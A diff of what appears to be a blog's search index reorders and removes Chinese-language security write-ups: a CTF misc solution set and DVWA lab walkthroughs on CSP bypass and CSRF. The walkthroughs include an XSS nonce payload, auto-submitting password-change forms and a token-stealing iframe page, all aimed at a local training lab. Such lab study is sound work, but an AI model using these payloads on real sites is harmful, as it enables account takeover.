@@ -255,45 +255,6 @@
       </tags>
   </entry>
   <entry>
-    <title>buu-5</title>
-    <url>/2021/07/14/buu-5/</url>
-    <content><![CDATA[<h1 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h1><p>我真的没点错题吗，逆向吧这波（好的题目写了。。。。。。），让我康康ida怎么用</p>
-<p>略微知道亿点点操作以后</p>
-<p><img src="/2021/07/14/buu-5/image-20210715135954810.png"></p>
-<p>这个伪代码还是可以看懂的，拼接就完事了</p>
-<h1 id="SWPU2019-伟大的侦探"><a href="#SWPU2019-伟大的侦探" class="headerlink" title="[SWPU2019]伟大的侦探"></a>[SWPU2019]伟大的侦探</h1><p>开局就跪了，这个编码是我不知道的了</p>
-<p><img src="/2021/07/14/buu-5/image-20210714191544093.png"></p>
-<p>EBCDIC（Extended Binary Coded Decimal Interchange Code）扩增二进式十进交换码，为IBM于1963年－1964年间推出的字符编码表，根据早期打孔机式的二进化十进数（BCD，Bindary Coded Decimal）排列而成。是IBM迷尔级以上电脑的标准码。<a href="https://www.qqxiuzi.cn/wz/zixun/1665.htm">https://www.qqxiuzi.cn/wz/zixun/1665.htm</a></p>
-<p><img src="/2021/07/14/buu-5/image-20210714195000670.png"></p>
-<p>解个跳舞小人（福尔摩斯小人密码）</p>
-<p><img src="/2021/07/14/buu-5/image-20201031092252316.png"></p>
-<p>flag{iloveholmesandwllm}和图片对应一下就可以找到了</p>
-<h1 id="SWPU2019-你有没有好好看网课"><a href="#SWPU2019-你有没有好好看网课" class="headerlink" title="[SWPU2019]你有没有好好看网课?"></a>[SWPU2019]你有没有好好看网课?</h1><p>谢邀，网课就没好好看过，眼睛不好属实看不见，了解到了一个新工具kinovea</p>
-<p><img src="/2021/07/14/buu-5/image-20210714205043569.png"></p>
-<p>这不放大一帧一帧看鬼看得见，找了好久，前面的flag.docx有提示5和7然后其实有个放大镜没有显示出来，但是列文虎克的话暗示显微镜<img src="/2021/07/14/buu-5/256767E4.png">吧</p>
-<p>（真的好小，我需要一双列文虎克的眼睛）</p>
-<p>后面还有一串base64，拼起来就是flag2压缩包密码，解完之后用010打开，搜索ctf即可找到flag。</p>
-<h1 id="MRCTF2020-ezmisc"><a href="#MRCTF2020-ezmisc" class="headerlink" title="[MRCTF2020]ezmisc"></a>[MRCTF2020]ezmisc</h1><p>没啥想说的，写一个小技巧，当</p>
-<p><img src="/2021/07/14/buu-5/image-20210717125159751.png"></p>
-<p>crc 报错时可以尝试去改一下图片高（很奇怪，我的010并不报错</p>
-<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>我以为是压缩包弱口令，尝试爆破，n分钟后，无果，发现压缩包有别的信息</p>
-<p><img src="/2021/07/14/buu-5/image-20210718134018368.png"></p>
-<p>但是好像看不出来是什么，复制一下，在各种文本编辑器里试图查看</p>
-<p><img src="/2021/07/14/buu-5/image-20210718134159164.png"></p>
-<p>你看这像不像莫斯密码</p>
-<p><img src="/2021/07/14/buu-5/image-20210718135411821.png"></p>
-<p>被→ 坑了一下这个是长的（包括了一个空格）然后一行是一个字母，就可以解压了</p>
-<p>png图片，通道分析完感觉是lsb隐写，但是解不出来，根据题目弱口令</p>
-<p>找到脚本，<a href="https://github.com/livz/cloacked-pixel">https://github.com/livz/cloacked-pixel</a></p>
-<p>模块安装n小时，<del>（每一台kali都有他的脾气</del></p>
-<p><img src="/2021/07/14/buu-5/image-20210718162413435.png"></p>
-<p><del>（终于成功了，太感人了</del></p>
-]]></content>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>buu-6</title>
     <url>/2021/07/19/buu-6/</url>
     <content><![CDATA[<h1 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h1><p>跟流量包逐渐熟悉起来，感觉这个包的信息挺多</p>
@@ -375,48 +336,42 @@
       </tags>
   </entry>
   <entry>
-    <title>dvwa-csp bypass</title>
-    <url>/2021/02/16/dvwa-csp-bypass/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSP 指的是<strong>内容安全策略</strong>，为了缓解很大一部分潜在的跨站脚本(XSS) 问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。通过引入一些相当严格的策略使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。<br>CSP 以<strong>白名单</strong>的机制对网站加载或执行的资源起作用，在网页中策略通过 HTTP 头信息或者 meta 元素定义。CSP 虽然提供了强大的安全保护，但是它也令 eval() 及相关函数被禁用、内嵌的 JavaScript 代码将不会执行、只能通过白名单来加载远程脚本。如果要使用 CSP 技术保护自己的网站，开发者就不得不花费大量时间分离内嵌的 JavaScript 代码和做一些调整。</p>
-<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218194206081.png"></p>
-<p>来看看源码</p>
-<p>最后那句不完整的注释：// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</p>
-<p>也就是说这个网页允许来自本身，pastebin.com, hastebin.com, jquery and google analytics 的js</p>
-<p>pastebin 是个快速分享文本内容的网站，假如文本的内容是一段 JavaScript 代码，网页就会把该代码包含进来。</p>
-<p>但是，火狐和谷歌貌似对此进行了修复，所以并没有弹窗出现</p>
-<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218201732112.png"></p>
-<p>来来看看源码</p>
-<p>这边是想通过使用nonce来防止攻击者添加内联脚本。</p>
-<p>Nonce是或Number once的缩写，在密码学中Nonce是一个只被使用一次的任意或非重复的随机数值。</p>
-<p>源码如下，HTTP 头信息中的 script-src 的合法来源发生了变化。script-src 还可以设置一些特殊值，<strong>unsafe-inline</strong> 允许执行页面内嵌的 <script> 标签和事件监听函数，<strong>nonce 值</strong>会在每次 HTTP 回应给出一个授权 token。</p>
-<p>只需要在输入框中输入</p>
-<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=" > alert'xss')</script>
-
-</p><p>即可</p>
-<p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218205101170.png"></p>
-<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218205642015.png"></p>
-<p>根据页面显示，我打开了jsonp.php</p>
-<p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218205839584.png"></p>
-<p>需要修改 jsonp.php 文件更改回调函数的脚本。</p>
-<p>来看看是怎么实现的</p>
-<p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218210422753.png"></p>
-<p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218213047118.png"></p>
-<p><strong>document 对象</strong>使我们可以从脚本中对 HTML 页面中的所有元素进行访问，</p>
-<p><strong>createElement()</strong> 方法通过指定名称创建一个元素，</p>
-<p><strong>body 属性</strong>提供对 &lt; body &gt; 元素的直接访问，对于定义了框架集的文档将引用最外层的 &lt; frameset &gt;。</p>
-<p><strong>appendChild()</strong> 方法可向节点的子节点列表的末尾添加新的子节点，也就是网页会把 “source/jsonp.php?callback=solveNum” 加入到 DOM 中。</p>
-<p><strong>getElementById() 方法</strong>可返回对拥有指定 ID 的第一个对象的引用</p>
-<p><strong>innerHTML 属性</strong>设置或返回表格行的开始和结束标签之间的 HTML。</p>
-<p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218234250419.png"></p>
-<p>抓包可发现，callback可控那么可以将solveSum改成</p>
-<p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218235726457.png"></p>
-<p>然后点forward进行放包，即可出现弹窗</p>
-<p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218235758504.png"></p>
-<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>这个级别是 high 级别的加强，JSONP 调用的回调函数是硬编码的，CSP 策略被锁定为只允许外部脚本。</p>
-<p>参考链接：<a href="https://www.cnblogs.com/linfangnan/p/13714694.htm">https://www.cnblogs.com/linfangnan/p/13714694.htm</a></p>
+    <title>buu-5</title>
+    <url>/2021/07/14/buu-5/</url>
+    <content><![CDATA[<h1 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h1><p>我真的没点错题吗，逆向吧这波（好的题目写了。。。。。。），让我康康ida怎么用</p>
+<p>略微知道亿点点操作以后</p>
+<p><img src="/2021/07/14/buu-5/image-20210715135954810.png"></p>
+<p>这个伪代码还是可以看懂的，拼接就完事了</p>
+<h1 id="SWPU2019-伟大的侦探"><a href="#SWPU2019-伟大的侦探" class="headerlink" title="[SWPU2019]伟大的侦探"></a>[SWPU2019]伟大的侦探</h1><p>开局就跪了，这个编码是我不知道的了</p>
+<p><img src="/2021/07/14/buu-5/image-20210714191544093.png"></p>
+<p>EBCDIC（Extended Binary Coded Decimal Interchange Code）扩增二进式十进交换码，为IBM于1963年－1964年间推出的字符编码表，根据早期打孔机式的二进化十进数（BCD，Bindary Coded Decimal）排列而成。是IBM迷尔级以上电脑的标准码。<a href="https://www.qqxiuzi.cn/wz/zixun/1665.htm">https://www.qqxiuzi.cn/wz/zixun/1665.htm</a></p>
+<p><img src="/2021/07/14/buu-5/image-20210714195000670.png"></p>
+<p>解个跳舞小人（福尔摩斯小人密码）</p>
+<p><img src="/2021/07/14/buu-5/image-20201031092252316.png"></p>
+<p>flag{iloveholmesandwllm}和图片对应一下就可以找到了</p>
+<h1 id="SWPU2019-你有没有好好看网课"><a href="#SWPU2019-你有没有好好看网课" class="headerlink" title="[SWPU2019]你有没有好好看网课?"></a>[SWPU2019]你有没有好好看网课?</h1><p>谢邀，网课就没好好看过，眼睛不好属实看不见，了解到了一个新工具kinovea</p>
+<p><img src="/2021/07/14/buu-5/image-20210714205043569.png"></p>
+<p>这不放大一帧一帧看鬼看得见，找了好久，前面的flag.docx有提示5和7然后其实有个放大镜没有显示出来，但是列文虎克的话暗示显微镜<img src="/2021/07/14/buu-5/256767E4.png">吧</p>
+<p>（真的好小，我需要一双列文虎克的眼睛）</p>
+<p>后面还有一串base64，拼起来就是flag2压缩包密码，解完之后用010打开，搜索ctf即可找到flag。</p>
+<h1 id="MRCTF2020-ezmisc"><a href="#MRCTF2020-ezmisc" class="headerlink" title="[MRCTF2020]ezmisc"></a>[MRCTF2020]ezmisc</h1><p>没啥想说的，写一个小技巧，当</p>
+<p><img src="/2021/07/14/buu-5/image-20210717125159751.png"></p>
+<p>crc 报错时可以尝试去改一下图片高（很奇怪，我的010并不报错</p>
+<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>我以为是压缩包弱口令，尝试爆破，n分钟后，无果，发现压缩包有别的信息</p>
+<p><img src="/2021/07/14/buu-5/image-20210718134018368.png"></p>
+<p>但是好像看不出来是什么，复制一下，在各种文本编辑器里试图查看</p>
+<p><img src="/2021/07/14/buu-5/image-20210718134159164.png"></p>
+<p>你看这像不像莫斯密码</p>
+<p><img src="/2021/07/14/buu-5/image-20210718135411821.png"></p>
+<p>被→ 坑了一下这个是长的（包括了一个空格）然后一行是一个字母，就可以解压了</p>
+<p>png图片，通道分析完感觉是lsb隐写，但是解不出来，根据题目弱口令</p>
+<p>找到脚本，<a href="https://github.com/livz/cloacked-pixel">https://github.com/livz/cloacked-pixel</a></p>
+<p>模块安装n小时，<del>（每一台kali都有他的脾气</del></p>
+<p><img src="/2021/07/14/buu-5/image-20210718162413435.png"></p>
+<p><del>（终于成功了，太感人了</del></p>
 ]]></content>
       <tags>
-        <tag>dvwa</tag>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -462,57 +417,45 @@
       </tags>
   </entry>
   <entry>
-    <title>dvwa-csrf</title>
-    <url>/2021/02/11/dvwa-csrf/</url>
-    <content><![CDATA[<h1 id="WHAT’S-CSRF"><a href="#WHAT’S-CSRF" class="headerlink" title="WHAT’S CSRF?"></a>WHAT’S CSRF?</h1><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，也被称为one-click attack或者session riding，是一种挟制用户在当前已登录的<a href="https://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=159605&ss_c=ssc.citiao.link">Web应用程序</a>上执行非本意的操作的攻击方法。</p>
-<p>它通过伪装来自受信任用户的请求来利用受信任的网站。</p>
-<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><p>首先我们构造一个链接，大概像这样</p>
-<p><a href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a></p>
-<p><del>（这明眼人都看得出来在改密码吧）</del></p>
-<p>但是如果有这么个没认真看的非酋，在他已经在浏览器登录了，然后还点了这个链接，<del>那就只能恭喜他，他</del>号<del>没</del>了~~</p>
-<p>但是（对，就是还有一个但是）这个前提必须要是同一个浏览器才行，cookie不能跨浏览器使用，那如果换了一个浏览器打开呢，那也只是会返回到登录界面</p>
-<p>那不如考虑把链接改造一下，比如生成短链接</p>
-<p><img src="/2021/02/11/dvwa-csrf/image-20210212102104168.png"></p>
-<p>（本地网址不支持）</p>
-<p>这看起来还不太一样，缩短链接试试</p>
-<p>但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。</p>
-<p>在网上看到了写页面的方法<a href="https://www.freebuf.com/articles/web/118352.html">https://www.freebuf.com/articles/web/118352.html</a></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found.<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>
+    <title>dvwa-csp bypass</title>
+    <url>/2021/02/16/dvwa-csp-bypass/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSP 指的是<strong>内容安全策略</strong>，为了缓解很大一部分潜在的跨站脚本(XSS) 问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。通过引入一些相当严格的策略使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。<br>CSP 以<strong>白名单</strong>的机制对网站加载或执行的资源起作用，在网页中策略通过 HTTP 头信息或者 meta 元素定义。CSP 虽然提供了强大的安全保护，但是它也令 eval() 及相关函数被禁用、内嵌的 JavaScript 代码将不会执行、只能通过白名单来加载远程脚本。如果要使用 CSP 技术保护自己的网站，开发者就不得不花费大量时间分离内嵌的 JavaScript 代码和做一些调整。</p>
+<h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218194206081.png"></p>
+<p>来看看源码</p>
+<p>最后那句不完整的注释：// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</p>
+<p>也就是说这个网页允许来自本身，pastebin.com, hastebin.com, jquery and google analytics 的js</p>
+<p>pastebin 是个快速分享文本内容的网站，假如文本的内容是一段 JavaScript 代码，网页就会把该代码包含进来。</p>
+<p>但是，火狐和谷歌貌似对此进行了修复，所以并没有弹窗出现</p>
+<h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218201732112.png"></p>
+<p>来来看看源码</p>
+<p>这边是想通过使用nonce来防止攻击者添加内联脚本。</p>
+<p>Nonce是或Number once的缩写，在密码学中Nonce是一个只被使用一次的任意或非重复的随机数值。</p>
+<p>源码如下，HTTP 头信息中的 script-src 的合法来源发生了变化。script-src 还可以设置一些特殊值，<strong>unsafe-inline</strong> 允许执行页面内嵌的 <script> 标签和事件监听函数，<strong>nonce 值</strong>会在每次 HTTP 回应给出一个授权 token。</p>
+<p>只需要在输入框中输入</p>
+<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=" > alert'xss')</script>
 
-<p>但是我这里运行的并不成功</p>
-<p>不如换一种写法</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ls<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>)</span></span><br>&#123;<br><span class="javascript"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;submit&quot;</span>).submit();</span><br>&#125;<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;attack()&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>= <span class="hljs-string">&quot;http://192.168.1.104/dvwa/vulnerabilities/csrf&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;submit&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot; password new&quot;</span> <span class="hljs-attr">value</span>= <span class="hljs-string">&quot;hack&quot;</span> <span class="hljs-attr">hidden</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>= <span class="hljs-string">&quot;password_conf&quot;</span> <span class="hljs-attr">value</span>= <span class="hljs-string">&quot;hack&quot;</span> <span class="hljs-attr">hidden</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">hidden</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/2021/02/11/dvwa-csrf/image-20210224124255265.png"></p>
-<p>但是这种方法，会返回到修改成功的界面上来</p>
-<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><p>来看看源码</p>
-<p><img src="/2021/02/11/dvwa-csrf/image-20210214193706473.png"></p>
-<p>和low不同的是，多了第5行</p>
-<p>检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数以及要访问的主机名）</p>
-<p>来抓包看看</p>
-<p><img src="/2021/02/11/dvwa-csrf/image-20210224125742537.png"></p>
-<p>也就是说只要http包头的Referer参数的值中包含主机名，即可绕过</p>
-<p><img src="/2021/02/11/dvwa-csrf/image-20210224135559394.png"></p>
-<p>在光标后面添加主机名的html即可成功，（我这里是对钓鱼网页进行抓包后修改）</p>
-<p>也可以用x-forward-for修改referer</p>
-<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><p>从源码得知，我们需要token</p>
-<p><img src="/2021/02/11/dvwa-csrf/image-20210224140222667.png"></p>
-<p>利用xssstored，来获取token</p>
-<p><img src="/2021/02/11/dvwa-csrf/image-20210224140625228.png"></p>
-<p><img src="/2021/02/11/dvwa-csrf/image-20210224144743262.png"></p>
-<p>然后我有了一个想法</p>
-<p><img src="/2021/02/11/dvwa-csrf/image-20210225164309546.png"></p>
-<p>利用短链接注入在xss漏洞中，引诱受害者点击该链接，即可实现改密</p>
-<p><a href="http://192.168.1.104/dvwa/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change&amp;user_token=">http://192.168.1.104/dvwa/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change&amp;user_token=</a>&lt;iframe src=”../csrf”onload=alert(frames[0].document.getElementsByName(‘user_token’)[0].value)# </p>
-<p>但是后半段的代码并不能成为网页的一部分，失败尝试+1 </p>
-<p>从理论上说我们可以写一个攻击代码</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>)</span></span><br><br>  &#123;<br><br><span class="javascript">   <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;hack&quot;</span>).contentWindow.document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].value;</span><br><br><span class="javascript">  <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;transfer&quot;</span>).submit(); </span><br><br>  &#125;<br><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br> <br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hack&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br> <br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;attack()&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;transfer&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_new&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_conf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user_token&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Change&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>但是，理想和现实，差距甚远。这里牵扯到了跨域问题，而现在的浏览器是不允许跨域请求的。这里简单解释下跨域，我们的框架iframe访问的地址是<a href="http://192.168.153.130/dvwa/vulnerabilities/csrf%EF%BC%8C%E4%BD%8D%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8192.168.153.130%E4%B8%8A%EF%BC%8C%E8%80%8C%E6%88%91%E4%BB%AC%E7%9A%84%E6%94%BB%E5%87%BB%E9%A1%B5%E9%9D%A2%E4%BD%8D%E4%BA%8E%E9%BB%91%E5%AE%A2%E6%9C%8D%E5%8A%A1%E5%99%A810.4.253.2%E4%B8%8A%EF%BC%8C%E4%B8%A4%E8%80%85%E7%9A%84%E5%9F%9F%E5%90%8D%E4%B8%8D%E5%90%8C%EF%BC%8C%E5%9F%9F%E5%90%8DB%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E9%A1%B5%E9%9D%A2%E9%83%BD%E4%B8%8D%E5%85%81%E8%AE%B8%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%90%8DA%E4%B8%8B%E7%9A%84%E9%A1%B5%E9%9D%A2%E5%86%85%E5%AE%B9%EF%BC%8C%E9%99%A4%E9%9D%9E%E5%9F%9F%E5%90%8DA%E4%B8%8B%E7%9A%84%E9%A1%B5%E9%9D%A2%E4%B8%BB%E5%8A%A8%E5%8F%91%E9%80%81%E4%BF%A1%E6%81%AF%E7%BB%99%E5%9F%9F%E5%90%8DB%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E7%9A%84%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%E6%98%AF%E4%B8%8D%E5%8F%AF%E8%83%BD%E5%8F%96%E5%88%B0%E6%94%B9%E5%AF%86%E7%95%8C%E9%9D%A2%E4%B8%AD%E7%9A%84user_token%E3%80%82">http://192.168.153.130/dvwa/vulnerabilities/csrf，位于服务器192.168.153.130上，而我们的攻击页面位于黑客服务器10.4.253.2上，两者的域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。</a></p>
-<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><p>这个要求原密码，就没什么办法了吧。</p>
-<p>参考链接：</p>
-<p><a href="https://blog.csdn.net/manok/article/details/103552937">https://blog.csdn.net/manok/article/details/103552937</a></p>
-<p><a href="https://www.freebuf.com/articles/web/118352.html">https://www.freebuf.com/articles/web/118352.html</a></p>
+</p><p>即可</p>
+<p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218205101170.png"></p>
+<h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218205642015.png"></p>
+<p>根据页面显示，我打开了jsonp.php</p>
+<p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218205839584.png"></p>
+<p>需要修改 jsonp.php 文件更改回调函数的脚本。</p>
+<p>来看看是怎么实现的</p>
+<p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218210422753.png"></p>
+<p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218213047118.png"></p>
+<p><strong>document 对象</strong>使我们可以从脚本中对 HTML 页面中的所有元素进行访问，</p>
+<p><strong>createElement()</strong> 方法通过指定名称创建一个元素，</p>
+<p><strong>body 属性</strong>提供对 &lt; body &gt; 元素的直接访问，对于定义了框架集的文档将引用最外层的 &lt; frameset &gt;。</p>
+<p><strong>appendChild()</strong> 方法可向节点的子节点列表的末尾添加新的子节点，也就是网页会把 “source/jsonp.php?callback=solveNum” 加入到 DOM 中。</p>
+<p><strong>getElementById() 方法</strong>可返回对拥有指定 ID 的第一个对象的引用</p>
+<p><strong>innerHTML 属性</strong>设置或返回表格行的开始和结束标签之间的 HTML。</p>
+<p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218234250419.png"></p>
+<p>抓包可发现，callback可控那么可以将solveSum改成</p>
+<p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218235726457.png"></p>
+<p>然后点forward进行放包，即可出现弹窗</p>
+<p><img src="/2021/02/16/dvwa-csp-bypass/image-20210218235758504.png"></p>
+<h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>这个级别是 high 级别的加强，JSONP 调用的回调函数是硬编码的，CSP 策略被锁定为只允许外部脚本。</p>
